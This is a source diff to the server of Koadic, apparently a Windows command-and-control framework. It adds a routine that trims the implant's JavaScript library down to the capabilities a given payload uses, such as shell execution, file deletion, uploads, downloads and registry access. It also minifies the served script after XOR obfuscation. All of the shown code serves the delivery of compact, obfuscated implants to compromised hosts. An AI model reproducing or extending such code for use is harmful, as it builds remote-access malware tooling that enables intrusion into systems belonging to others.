@@ -311,10 +311,64 @@ class Handler(BaseHTTPRequestHandler):
             postvars = {}
         return postvars
 
+    # this removes functions that the current script doesn't use
+    def trim_stdlib(self, stdlib, script):
+        stdlib = stdlib.decode()
+        script = script.decode()
+        if "Koadic.user.info" not in script:
+            stdlib = stdlib.split("//user.info.start")[0] + stdlib.split("//user.info.end")[1]
+            if "Koadic.user.isElevated" not in script:
+                stdlib = stdlib.split("//user.isElevated.start")[0] + stdlib.split("//user.isElevated.end")[1]
+            if "Koadic.user.OS" not in script:
+                stdlib = stdlib.split("//user.OS.start")[0] + stdlib.split("//user.OS.end")[1]
+            if "Koadic.user.DC" not in script:
+                stdlib = stdlib.split("//user.DC.start")[0] + stdlib.split("//user.DC.end")[1]
+            if "Koadic.user.Arch" not in script:
+                stdlib = stdlib.split("//user.Arch.start")[0] + stdlib.split("//user.Arch.end")[1]
+            if "Koadic.user.CWD" not in script:
+                stdlib = stdlib.split("//user.CWD.start")[0] + stdlib.split("//user.CWD.end")[1]
+                if "Koadic.shell.exec" not in script:
+                    stdlib = stdlib.split("//shell.exec.start")[0] + stdlib.split("//shell.exec.end")[1]
+                    if "Koadic.file.readText" not in script:
+                        stdlib = stdlib.split("//file.readText.start")[0] + stdlib.split("//file.readText.end")[1]
+                        if "Koadic.shell.run" not in script:
+                            stdlib = stdlib.split("//shell.run.start")[0] + stdlib.split("//shell.run.end")[1]
+                    if "Koadic.file.deleteFile" not in script:
+                        stdlib = stdlib.split("//file.deleteFile.start")[0] + stdlib.split("//file.deleteFile.end")[1]
+
+            if "Koadic.user.IPAddrs" not in script:
+                stdlib = stdlib.split("//user.IPAddrs.start")[0] + stdlib.split("//user.IPAddrs.end")[1]
+
+        if "Koadic.work.fork" not in script:
+            stdlib = stdlib.split("//work.fork.start")[0] + stdlib.split("//work.fork.end")[1]
+
+        if "Koadic.http.upload" not in script:
+            stdlib = stdlib.split("//http.upload.start")[0] + stdlib.split("//http.upload.end")[1]
+            if "Koadic.file.readBinary" not in script:
+                stdlib = stdlib.split("//file.readBinary.start")[0] + stdlib.split("//file.readBinary.end")[1]
+
+        if "Koadic.http.download" not in script:
+            stdlib = stdlib.split("//http.download.start")[0] + stdlib.split("//http.download.end")[1]
+            if "Koadic.http.downloadEx" not in script:
+                stdlib = stdlib.split("//http.downloadEx.start")[0] + stdlib.split("//http.downloadEx.end")[1]
+                if "Koadic.http.bin2str" not in script:
+                    stdlib = stdlib.split("//http.bin2str.start")[0] + stdlib.split("//http.bin2str.end")[1]
+                if "Koadic.file.write" not in script:
+                    stdlib = stdlib.split("//file.write.start")[0] + stdlib.split("//file.write.end")[1]
+
+        if "Koadic.registry" not in script:
+            stdlib = stdlib.split("//registry.start")[0] + stdlib.split("//registry.end")[1]
+
+        stdlib += "\n"
+
+        return stdlib.encode()
+
     # ugly dragons, turn back
     def post_process_script(self, script, template, stdlib=True):
         if stdlib:
-            script = self.options.get("_STDLIB_") + script
+            stdlib_content = self.options.get("_STDLIB_")
+            trimmed_stdlib = self.trim_stdlib(stdlib_content, script)
+            script = trimmed_stdlib + script
 
             # crappy hack for forkcmd
             forkopt = copy.deepcopy(self.options)
@@ -356,6 +410,7 @@ class Handler(BaseHTTPRequestHandler):
                 xor_key = self.loader.create_xor_key()
                 xor_script = self.loader.xor_data(script, xor_key)
                 script = self.loader.xor_js_file(xor_script.decode(), xor_key).encode()
+            script = jsmin(script.decode()).encode()
 
         script = template.replace(b"~SCRIPT~", script)
         return script
